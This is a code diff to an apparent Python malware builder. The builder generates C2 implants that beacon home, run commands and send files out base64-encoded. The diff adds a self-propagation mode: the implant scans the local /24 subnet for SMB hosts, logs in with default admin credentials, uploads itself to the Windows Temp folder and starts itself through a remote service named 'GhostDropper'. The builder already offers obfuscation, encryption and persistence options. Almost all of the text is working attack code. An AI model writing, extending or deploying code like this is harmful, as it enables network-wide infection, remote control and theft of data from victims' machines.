@@ -29,8 +29,56 @@ from crypto import aes_encrypt
 
 C2_URL = "{c2_url}"
 RESULT_URL = "{result_url}"
+IS_WORM = {is_worm}
+
+def scan_subnet():
+    base_ip = socket.gethostbyname(socket.gethostname()).rsplit('.', 1)[0] + '.'
+    live_hosts = []
+    for i in range(1, 255):
+        ip = base_ip + str(i)
+        try:
+            sock = socket.create_connection((ip, 445), timeout=0.3)
+            live_hosts.append(ip)
+            sock.close()
+        except:
+            pass
+    return live_hosts
+
+def lateral_move(ip, username, password, local_payload_path):
+    try:
+        from impacket.smbconnection import SMBConnection
+        from impacket.smbconnection import SessionError
+
+        print(f"[+] Connecting to {{ip}} over SMB...")
+        conn = SMBConnection(ip, ip)
+        conn.login(username, password)
+        print(f"[+] Authenticated to {{ip}}")
+
+        with open(local_payload_path, "rb") as f:
+            payload_data = f.read()
+
+        remote_path = "Windows\\\\Temp\\\\worm.py"
+        conn.putFile("C$", remote_path, lambda _: payload_data)
+        print(f"[+] Payload uploaded to {{ip}}\\\\{{remote_path}}")
+
+        service_name = "GhostDropper"
+        command = f"cmd.exe /c python C:\\\\Windows\\\\Temp\\\\worm.py"
+        conn.createService(service_name, command)
+        print(f"[+] Remote execution triggered on {{ip}}")
+
+    except SessionError as e:
+        print(f"[!] SMB SessionError: {{e}}")
+    except Exception as ex:
+        print(f"[!] Lateral move failed: {{ex}}")
 
 def {beacon_func}():
+    if IS_WORM:
+        print("[*] Worm mode enabled — beginning propagation...")
+        targets = scan_subnet()
+        print(f"[*] Discovered {{len(targets)}} live targets.")
+        for ip in targets:
+            lateral_move(ip, "admin", "password", "builds/ghost_payload_drop.py")
+
     {host_var} = socket.gethostname()
 
     while True:
@@ -55,7 +103,7 @@ def {beacon_func}():
                         try:
                             with open({file_path}, "rb") as f:
                                 {b64data} = base64.b64encode(f.read()).decode()
-                            {result_var} = f"[EXFIL:{{{file_path}}}]\\n{{{b64data}}}"
+                            {result_var} = f"[EXFIL:{{{file_path}}}]\\\\n{{{b64data}}}"
                         except Exception as e:
                             {result_var} = f"[!] Failed to read file: {{e}}"
                     else:
@@ -65,7 +113,7 @@ def {beacon_func}():
                         except subprocess.CalledProcessError as e:
                             {result_var} = f"[!] Command failed: {{e.output.decode().strip()}}"
 
-                    print("[>] Sending result:\\n{{}}".format({result_var}))
+                    print(f"[>] Sending result:\\n{{{{{result_var}}}}}")
 
                     {result_obj} = {{
                         "hostname": {host_var},
@@ -82,10 +130,10 @@ def {beacon_func}():
         sleep_time = max(1, SLEEP_TIME + jitter)
         time.sleep(sleep_time)
 
-
 if __name__ == "__main__":
     {beacon_func}()
 '''
+
 
 # === Helpers ===
 def rand_name(length=8):
@@ -110,7 +158,7 @@ def generate_variable_names():
         'b64data': rand_name()
     }
 
-def generate_payload(c2_url, result_url, output_path):
+def generate_payload(c2_url, result_url, output_path, is_worm):
     var_names = generate_variable_names()
 
     script_dir = os.path.dirname(os.path.abspath(__file__))
@@ -122,6 +170,7 @@ def generate_payload(c2_url, result_url, output_path):
         c2_url=c2_url,
         result_url=result_url,
         abs_utils_path=abs_utils_path,
+        is_worm=is_worm,
         **var_names
     )
 
@@ -156,6 +205,7 @@ if __name__ == "__main__":
     parser.add_argument("--obfuscate", action="store_true", help="Apply string or function obfuscation")
     parser.add_argument("--encrypt", action="store_true", help="Apply additional encryption layer")
     parser.add_argument("--persist", action="store_true", help="Add persistence stub")
+    parser.add_argument("--worm", action="store_true", help="Enable self-propagation mode")
     parser.add_argument("--output", help="Custom output filename for payload")
     args = parser.parse_args()
 
@@ -168,7 +218,7 @@ if __name__ == "__main__":
         filename = f"ghost_payload_{timestamp}.py"
         output_path = os.path.join("builds", filename)
 
-    generate_payload(args.c2, args.result, output_path)
+    generate_payload(args.c2, args.result, output_path, args.worm)
 
     if args.exe:
         compile_to_exe(output_path)
